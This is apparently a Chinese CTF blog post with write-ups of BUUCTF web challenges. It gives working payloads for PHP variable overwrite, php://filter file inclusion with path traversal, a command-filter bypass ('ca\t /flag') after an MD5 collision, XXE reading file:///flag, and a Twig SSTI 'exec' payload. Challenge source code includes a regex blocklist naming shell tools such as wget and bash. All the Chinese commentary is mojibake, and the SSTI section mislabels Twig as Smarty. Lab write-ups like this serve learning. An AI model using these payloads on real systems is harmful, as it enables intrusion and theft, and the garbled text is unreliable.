<div class="hljs code-wrapper"><pre><code>&lt;?php
include &#39;flag.php&#39;;

$yds = &quot;dog&quot;;
$is = &quot;cat&quot;;
$handsome = &#39;yds&#39;;

foreach($_POST as $x =&gt; $y)&#123;        
    $$x = $y;                        
&#125;


foreach($_GET as $x =&gt; $y)&#123;            
    $$x = $$y;                        
&#125;

//get handsome=flag
//$yds=$flag


foreach($_GET as $x =&gt; $y)&#123;            
    if($_GET[&#39;flag&#39;] === $x &amp;&amp; $x !== &#39;flag&#39;)&#123;        //è¿™ä¸ªifç»•ä¸è¿‡å»--&gt;æ— æ³•è¾“å‡º$handsome--&gt;$handsome!=flag
        exit($handsome);
    &#125;
&#125;

if(!isset($_GET[&#39;flag&#39;]) &amp;&amp; !isset($_POST[&#39;flag&#39;]))&#123;    //å°è¯•å˜é‡yds---&gt;get flag---&gt;game over
    exit($yds);
&#125;

if($_POST[&#39;flag&#39;] === &#39;flag&#39;  || $_GET[&#39;flag&#39;] === &#39;flag&#39;)&#123;    //...get is=flag&amp;flag=flag
    exit($is);
&#125;

echo &quot;the flag is: &quot;.$flag;
</code></pre></div>
<p>â€”&gt;flag.php</p>
<div class="hljs code-wrapper"><pre><code>&lt;?php
$flag = file_get_contents(&#39;/flag&#39;);
</code></pre></div>
<p>payload</p>
<div class="hljs code-wrapper"><pre><code>?yds=flag
//
?is=flag&amp;flag=flag
</code></pre></div>
<h1 id="BSidesCF-2020-Had-a-bad-day"><a href="#BSidesCF-2020-Had-a-bad-day" class="headerlink" title="[BSidesCF 2020]Had a bad day"></a>[BSidesCF 2020]Had a bad day</h1><p>é€‰æ‹©æŒ‰é’®ï¼Œå±•ç¤ºå›¾ç‰‡ï¼Œurlâ€“&gt;?category=</p>
<p>çŒœæµ‹ä¸ºincludeï¼Œå°è¯•ä¼ªåè®®</p>
<div class="hljs code-wrapper"><pre><code>php://filter/read=convert.base64-encode/resource=index.php
</code></pre></div>
<p>æŠ¥é”™</p>
<div class="hljs code-wrapper"><pre><code>php://filter/read=convert.base64-encode/resource=index
</code></pre></div>
<p>è¯»åˆ°indexï¼Œä»…æˆªå–phpéƒ¨åˆ†</p>
<div class="hljs code-wrapper"><pre><code>&lt;?php
    $file = $_GET[&#39;category&#39;];

    if(isset($file))
    &#123;    
        //åˆ¤æ–­woofers/meowers/indexåœ¨$fileä¸­ç¬¬ä¸€æ¬¡å‡ºç°çš„ä½ç½®---&gt;å°è¯•ç»•è¿‡strops/æ„é€ payload
        if( strpos( $file, &quot;woofers&quot; ) !==  false || strpos( $file, &quot;meowers&quot; ) !==  false || strpos( $file, &quot;index&quot;))&#123;
                include ($file . &#39;.php&#39;);
        &#125;
        else&#123;
            echo &quot;Sorry, we currently only support woofers and meowers.&quot;;
        &#125;
    &#125;
    ?&gt;
</code></pre></div>
<p>å°è¯•è¯»/flagã€lsã€evalâ€¦</p>
<p>htmlä¸‹flag.phpâ€¦</p>
<h2 id="strpos-æŸ¥æ‰¾å­—ç¬¦ä¸²åœ¨å¦ä¸€å­—ç¬¦ä¸²ä¸­ç¬¬ä¸€æ¬¡å‡ºç°çš„ä½ç½®"><a href="#strpos-æŸ¥æ‰¾å­—ç¬¦ä¸²åœ¨å¦ä¸€å­—ç¬¦ä¸²ä¸­ç¬¬ä¸€æ¬¡å‡ºç°çš„ä½ç½®" class="headerlink" title="strpos() æŸ¥æ‰¾å­—ç¬¦ä¸²åœ¨å¦ä¸€å­—ç¬¦ä¸²ä¸­ç¬¬ä¸€æ¬¡å‡ºç°çš„ä½ç½®"></a>strpos() æŸ¥æ‰¾å­—ç¬¦ä¸²åœ¨å¦ä¸€å­—ç¬¦ä¸²ä¸­ç¬¬ä¸€æ¬¡å‡ºç°çš„ä½ç½®</h2><h2 id="è·¯å¾„æ‹¼æ¥è¯»å½“å‰ç›®å½•è¯­å¥-index-flag"><a href="#è·¯å¾„æ‹¼æ¥è¯»å½“å‰ç›®å½•è¯­å¥-index-flag" class="headerlink" title="è·¯å¾„æ‹¼æ¥è¯»å½“å‰ç›®å½•è¯­å¥ index/../flag"></a>è·¯å¾„æ‹¼æ¥è¯»å½“å‰ç›®å½•è¯­å¥ index/../flag</h2><p>payload</p>
<div class="hljs code-wrapper"><pre><code>php://filter/read=convert.base64-encode/resource=index/../flag
</code></pre></div>
<h1 id="å®‰æ´µæ¯-2019-easy-web"><a href="#å®‰æ´µæ¯-2019-easy-web" class="headerlink" title="[å®‰æ´µæ¯ 2019]easy_web"></a>[å®‰æ´µæ¯ 2019]easy_web</h1><p>urlâ€“&gt;index.php?img=TXpVek5UTTFNbVUzTURabE5qYz0&amp;cmd=</p>
<p>TXpVek5UTTFNbVUzTURabE5qYz0<br>ä¸¤æ¬¡base64è§£ç â€”&gt;åå…­è¿›åˆ¶è½¬å­—ç¬¦ä¸²â€”&gt;555.png</p>
<p>åŒç†<br>index.php<br>å­—ç¬¦ä¸²è½¬åå…­è¿›åˆ¶â€”&gt;ä¸¤æ¬¡base64ç¼–ç â€”&gt;å¾—åˆ°index.phpçš„base64</p>
<p>å¾—åˆ°index.phpæºç </p>
<div class="hljs code-wrapper"><pre><code>&lt;?php
error_reporting(E_ALL || ~ E_NOTICE);
header(&#39;content-type:text/html;charset=utf-8&#39;);
$cmd = $_GET[&#39;cmd&#39;];
if (!isset($_GET[&#39;img&#39;]) || !isset($_GET[&#39;cmd&#39;])) 
    header(&#39;Refresh:0;url=./index.php?img=TXpVek5UTTFNbVUzTURabE5qYz0&amp;cmd=&#39;);
$file = hex2bin(base64_decode(base64_decode($_GET[&#39;img&#39;])));

$file = preg_replace(&quot;/[^a-zA-Z0-9.]+/&quot;, &quot;&quot;, $file);
if (preg_match(&quot;/flag/i&quot;, $file)) &#123;
    echo &#39;&lt;img src =&quot;./ctf3.jpeg&quot;&gt;&#39;;
    die(&quot;xixiï½ no flag&quot;);
&#125; else &#123;
    $txt = base64_encode(file_get_contents($file));
    echo &quot;&lt;img src=&#39;data:image/gif;base64,&quot; . $txt . &quot;&#39;&gt;&lt;/img&gt;&quot;;
    echo &quot;&lt;br&gt;&quot;;
&#125;
echo $cmd;
echo &quot;&lt;br&gt;&quot;;
if (preg_match(&quot;/ls|bash|tac|nl|more|less|head|wget|tail|vi|cat|od|grep|sed|bzmore|bzless|pcre|paste|diff|file|echo|sh|\&#39;|\&quot;|\`|;|,|\*|\?|\\|\\\\|\n|\t|\r|\xA0|\&#123;|\&#125;|\(|\)|\&amp;[^\d]|@|\||\\$|\[|\]|&#123;|&#125;|\(|\)|-|&lt;|&gt;/i&quot;, $cmd)) &#123;
    echo(&quot;forbid ~&quot;);
    echo &quot;&lt;br&gt;&quot;;
&#125; else &#123;
    if ((string)$_POST[&#39;a&#39;] !== (string)$_POST[&#39;b&#39;] &amp;&amp; md5($_POST[&#39;a&#39;]) === md5($_POST[&#39;b&#39;])) &#123;
        echo `$cmd`;
    &#125; else &#123;
        echo (&quot;md5 is funny ~&quot;);
    &#125;
&#125;
?&gt;
</code></pre></div>
<p>md5çœŸå®ç¢°æ’ï¼Œç¿»åšå®¢â€¦</p>
<h2 id="lsè¿‡æ»¤ç”¨dir"><a href="#lsè¿‡æ»¤ç”¨dir" class="headerlink" title="lsè¿‡æ»¤ç”¨dir"></a>lsè¿‡æ»¤ç”¨dir</h2><p>â€¦æ‰çŸ¥é“â€¦</p>
<p>dir å½“å‰ç›®å½•ä¸‹æ—  flag</p>
<p>dir+/</p>
<p>æ ¹ç›®å½•ä¸‹flag</p>
<h2 id="ç‰¹æ®Šå­—ç¬¦çš„ä½¿ç”¨"><a href="#ç‰¹æ®Šå­—ç¬¦çš„ä½¿ç”¨" class="headerlink" title="ç‰¹æ®Šå­—ç¬¦çš„ä½¿ç”¨"></a>ç‰¹æ®Šå­—ç¬¦çš„ä½¿ç”¨</h2><p>ca\t åé¢çš„\tä¼šæˆä¸º TAB è€Œç»•è¿‡</p>
<p>payload </p>
<div class="hljs code-wrapper"><pre><code>ca\t+/flag
</code></pre></div>
<h1 id="NCTF2019-Fake-XML-cookbook"><a href="#NCTF2019-Fake-XML-cookbook" class="headerlink" title="[NCTF2019]Fake XML cookbook"></a>[NCTF2019]Fake XML cookbook</h1><div class="hljs code-wrapper"><pre><code>function doLogin()&#123;
var username = $(&quot;#username&quot;).val();
var password = $(&quot;#password&quot;).val();
if(username == &quot;&quot; || password == &quot;&quot;)&#123;
    alert(&quot;Please enter the username and password!&quot;);
    return;
&#125;

var data = &quot;&lt;user&gt;&lt;username&gt;&quot; + username + &quot;&lt;/username&gt;&lt;password&gt;&quot; + password + &quot;&lt;/password&gt;&lt;/user&gt;&quot;; 
$.ajax(&#123;
    type: &quot;POST&quot;,
    url: &quot;doLogin.php&quot;,
    contentType: &quot;application/xml;charset=utf-8&quot;,
    data: data,
    dataType: &quot;xml&quot;,
    anysc: false,
    success: function (result) &#123;
        var code = result.getElementsByTagName(&quot;code&quot;)[0].childNodes[0].nodeValue;
        var msg = result.getElementsByTagName(&quot;msg&quot;)[0].childNodes[0].nodeValue;
        if(code == &quot;0&quot;)&#123;
            $(&quot;.msg&quot;).text(msg + &quot; login fail!&quot;);
        &#125;else if(code == &quot;1&quot;)&#123;
            $(&quot;.msg&quot;).text(msg + &quot; login success!&quot;);
        &#125;else&#123;
            $(&quot;.msg&quot;).text(&quot;error:&quot; + msg);
        &#125;
    &#125;,
    error: function (XMLHttpRequest,textStatus,errorThrown) &#123;
        $(&quot;.msg&quot;).text(errorThrown + &#39;:&#39; + textStatus);
    &#125;
&#125;); 
&#125;
</code></pre></div>
<p>æŠ“åŒ…â€¦æ²¡è§è¿‡â€¦  </p>
<div class="hljs code-wrapper"><pre><code>&lt;user&gt;&lt;username&gt;1&lt;/username&gt;&lt;password&gt;1&lt;/password&gt;&lt;/user&gt;
</code></pre></div>
<p>æµ‹è¯•sqlæ— å›æ˜¾ï¼Œå°è¯•xssï¼Œ æ— æœ</p>
<p>â€”&gt;XXEâ€”XMLå¤–éƒ¨å®ä½“æ³¨å…¥</p>
<h2 id="XXEâ€”XMLå¤–éƒ¨å®ä½“æ³¨å…¥"><a href="#XXEâ€”XMLå¤–éƒ¨å®ä½“æ³¨å…¥" class="headerlink" title="XXEâ€”XMLå¤–éƒ¨å®ä½“æ³¨å…¥"></a>XXEâ€”XMLå¤–éƒ¨å®ä½“æ³¨å…¥</h2><p>XMLæ–‡ä»¶åœ¨å¼•ç”¨å¤–éƒ¨å®ä½“æ—¶å€™,å¯ä»¥æ²Ÿé€šæ„é€ æ¶æ„å†…å®¹,å¯ä»¥å¯¼è‡´è¯»å–ä»»æ„æ–‡ä»¶,å‘½ä»¤æ‰§è¡Œå’Œå¯¹å†…ç½‘çš„æ”»å‡»,è¿™å°±æ˜¯XXEæ¼æ´</p>
<p>payload </p>
<div class="hljs code-wrapper"><pre><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;
&lt;!DOCTYPE note [
  &lt;!ENTITY admin SYSTEM &quot;file:///flag&quot;&gt;
  ]&gt;
&lt;user&gt;&lt;username&gt;&amp;admin;&lt;/username&gt;&lt;password&gt;123456&lt;/password&gt;&lt;/user&gt;
</code></pre></div>
<p>è§£é‡Špayload</p>
<div class="hljs code-wrapper"><pre><code>//å…ˆæ·»åŠ xmlæ–‡ä»¶å¤´ï¼šç§°ä¸º XML prolog ï¼Œç”¨äºå£°æ˜XMLæ–‡æ¡£çš„ç‰ˆæœ¬å’Œç¼–ç ï¼Œæ˜¯å¯é€‰çš„ï¼Œå¿…é¡»æ”¾åœ¨æ–‡æ¡£å¼€å¤´
&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot; standalone=&quot;yes&quot;?&gt;

standaloneå€¼æ˜¯yesçš„æ—¶å€™è¡¨ç¤ºDTDä»…ç”¨äºéªŒè¯æ–‡æ¡£ç»“æ„ï¼Œä»è€Œå¤–éƒ¨å®ä½“å°†è¢«ç¦ç”¨ï¼Œä½†å®ƒçš„é»˜è®¤å€¼æ˜¯noï¼Œè€Œä¸”æœ‰äº›parserä¼šç›´æ¥å¿½ç•¥è¿™ä¸€é¡¹

æŒ‰å®ä½“æœ‰æ— å‚åˆ†ç±»ï¼Œå®ä½“åˆ†ä¸ºä¸€èˆ¬å®ä½“å’Œå‚æ•°å®ä½“ï¼Œä¸€èˆ¬å®ä½“çš„å£°æ˜ï¼š
&lt;!ENTITY å®ä½“åç§° &quot;å®ä½“å†…å®¹&quot;&gt;
å¼•ç”¨ä¸€èˆ¬å®ä½“çš„æ–¹æ³•ï¼š&amp;å®ä½“åç§°;

å¤–éƒ¨å®ä½“ï¼Œç”¨æ¥å¼•å…¥å¤–éƒ¨èµ„æºã€‚æœ‰SYSTEMå’ŒPUBLICä¸¤ä¸ªå…³é”®å­—ï¼Œè¡¨ç¤ºå®ä½“æ¥è‡ªæœ¬åœ°è®¡ç®—æœºè¿˜æ˜¯å…¬å…±è®¡ç®—æœº

å› ä¸ºå°†file:///flagå‘½åä¸ºadminï¼Œæ‰€ä»¥ä¸‹é¢ç”¨&amp;admin;
</code></pre></div>
<h1 id="BJDCTF2020-Cookie-is-so-stable"><a href="#BJDCTF2020-Cookie-is-so-stable" class="headerlink" title="[BJDCTF2020]Cookie is so stable"></a>[BJDCTF2020]Cookie is so stable</h1><div class="hljs code-wrapper"><pre><code>&#123;&#123;7*7&#125;&#125;
ç¡®å®šssti
</code></pre></div>
<h2 id="ssti-Smarty"><a href="#ssti-Smarty" class="headerlink" title="ssti Smarty"></a>ssti Smarty</h2><div class="hljs code-wrapper"><pre><code>&#123;&#123;_self.env.registerUndefinedFilterCallback("exec")&#125;&#125;&#123;&#123;_self.env.getFilter("cat /flag")&#125;&#125;
</code></pre></div>
<h1 id="WUSTCTF2020-æœ´å®æ— å"><a href="#WUSTCTF2020-æœ´å®æ— å" class="headerlink" title="[WUSTCTF2020]æœ´å®æ— å"></a>[WUSTCTF2020]æœ´å®æ— å</h1>
            </div>
            <hr>
            <div>
              <div class="post-metas mb-3">
                
                
                  <div class="post-meta">
                    <i class="iconfont icon-tags"></i>
                    
                      <a class="hover-with-bg" href="/tags/web-buu/">web buu</a>
                    
                  </div>
                
              </div>
              
                <p class="note note-warning">
                  
                    æœ¬åšå®¢æ‰€æœ‰æ–‡ç« é™¤ç‰¹åˆ«å£°æ˜å¤–ï¼Œå‡é‡‡ç”¨ <a target="_blank" href="https://creativecommons.org/licenses/by-sa/4.0/deed.zh" rel="nofollow noopener noopener">CC BY-SA 4.0 åè®®</a> ï¼Œè½¬è½½è¯·æ³¨æ˜å‡ºå¤„ï¼
                  
                </p>
              
              
                <div class="post-prevnext">
                  <article class="post-prev col-6">
                    
                    
                      <a href="/2021/10/27/PHP-ways/">
                        <i class="iconfont icon-arrowleft"></i>
                        <span class="hidden-mobile">PHP-way</span>
                        <span class="visible-mobile">ä¸Šä¸€ç¯‡</span>
                      </a>
                    
                  </article>
                  <article class="post-next col-6">
                    
                    
                      <a href="/2021/07/24/sql-ways/">
                        <span class="hidden-mobile">sql-ways</span>
                        <span class="visible-mobile">ä¸‹ä¸€ç¯‡</span>
                        <i class="iconfont icon-arrowright"></i>
                      </a>
                    
                  </article>
                </div>
              
            </div>

            
          </article>
        </div>
      </div>
    </div>
    
      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
        <div id="toc">
  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;ç›®å½•</p>
  <div class="toc-body" id="toc-body"></div>
</div>

      </div>
    
  </div>
</div>

<!-- Custom -->


    

    
      <a id="scroll-top-button" href="#" role="button">
        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
      </a>
    

    
      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
     aria-hidden="true">
  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
    <div class="modal-content">
      <div class="modal-header text-center">
        <h4 class="modal-title w-100 font-weight-bold">æœç´¢</h4>
        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
          <span aria-hidden="true">&times;</span>
        </button>
      </div>
      <div class="modal-body mx-3">
        <div class="md-form mb-5">
          <input type="text" id="local-search-input" class="form-control validate">
          <label data-error="x" data-success="v"
                 for="local-search-input">å…³é”®è¯</label>
        </div>
        <div class="list-group" id="local-search-result"></div>
      </div>
    </div>
  </div>
</div>
    

    
  </main>

  <footer class="text-center mt-5 py-3">
<a href="http://www.beian.miit.gov.cn/"  style="color:#f72b07" target="_blank">è‹ICPå¤‡2021015436å·-1</a>
  <div class="footer-content">
     <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
  </div>
  
  <div class="statistics">
    
    

    
      
        <!-- ä¸è’œå­ç»Ÿè®¡PV -->
        <span id="busuanzi_container_site_pv" style="display: none">
            æ€»è®¿é—®é‡ 
            <span id="busuanzi_value_site_pv"></span>
             æ¬¡
          </span>
      
      
        <!-- ä¸è’œå­ç»Ÿè®¡UV -->
        <span id="busuanzi_container_site_uv" style="display: none">
            æ€»è®¿å®¢æ•° 
            <span id="busuanzi_value_site_uv"></span>
             äºº
          </span>
      
    
  </div>


  

  
</footer>


  <!-- SCRIPTS -->
  
  <script  src="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.js" ></script>
  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.css" />

  <script>
    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
    NProgress.start()
    window.addEventListener('load', function() {
      NProgress.done();
    })
  </script>


<script  src="https://cdn.jsdelivr.net/npm/jquery@3.6.0/dist/jquery.min.js" ></script>
<script  src="https://cdn.jsdelivr.net/npm/bootstrap@4.6.0/dist/js/bootstrap.min.js" ></script>
<script  src="/js/events.js" ></script>
<script  src="/js/plugins.js" ></script>

<!-- Plugins -->


  
    <script  src="/js/img-lazyload.js" ></script>
  



  



  <script  src="https://cdn.jsdelivr.net/npm/tocbot@4.12.3/dist/tocbot.min.js" ></script>



  <script  src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js" ></script>



  <script  src="https://cdn.jsdelivr.net/npm/anchor-js@4.3.1/anchor.min.js" ></script>



  <script defer src="https://cdn.jsdelivr.net/npm/clipboard@2.0.8/dist/clipboard.min.js" ></script>



  <script  src="/js/local-search.js" ></script>



  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>




  <script  src="https://cdn.jsdelivr.net/npm/typed.js@2.0.12/lib/typed.min.js" ></script>
  <script>
    (function (window, document) {
      var typing = Fluid.plugins.typing;
      var title = document.getElementById('subtitle').title;
      
      typing(title)
      
    })(window, document);
  </script>












  

  

  

  

  

  





<!-- ä¸»é¢˜çš„å¯åŠ¨é¡¹ ä¿æŒåœ¨æœ€åº•éƒ¨ -->
<script  src="/js/boot.js" ></script>


</body>
</html>
